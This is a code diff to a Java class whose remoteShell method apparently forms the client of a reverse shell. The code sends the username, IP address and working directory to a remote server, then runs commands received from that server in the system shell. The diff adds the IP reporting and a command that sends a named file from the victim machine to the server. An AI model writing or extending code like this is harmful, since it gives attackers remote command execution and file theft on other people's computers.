@@ -35,20 +35,22 @@ public class LinuxCommandSet extends CommandSet
     public void remoteShell()
     {
         sendStringToServer(System.getProperty("user.name"));
+        sendStringToServer(getIpAddress());
         String workingDirectory = getTempPath();
         sendStringToServer(workingDirectory);
+
         String inputCommand;
-        // Remote Shell Protocol...
-        //
-        // send working directory path to server
-        // if(any output from command)
-        //     send output to server
-        // else
-        //     send end marker to server
         while(!(inputCommand = getCommandFromServer()).equals(REMOTE_SHELL_TERMINATE))
         {
             try
             {
+                if(inputCommand.startsWith(REMOTE_SHELL_TRANSFER))
+                {
+                    String filePathToTransfer = inputCommand.split("\\s+")[1]; // get_file thefile
+                    sendFile(new File(workingDirectory + File.separator + filePathToTransfer));
+                    continue;
+                }
+
                 System.out.println("Working directory: " + workingDirectory);
                 System.out.println("Using command: " + inputCommand);
                 // runs the systems shell, changes dir to the current one, runs the supplied command, then pwd so we can track our current location (if user ran a dir changing command)
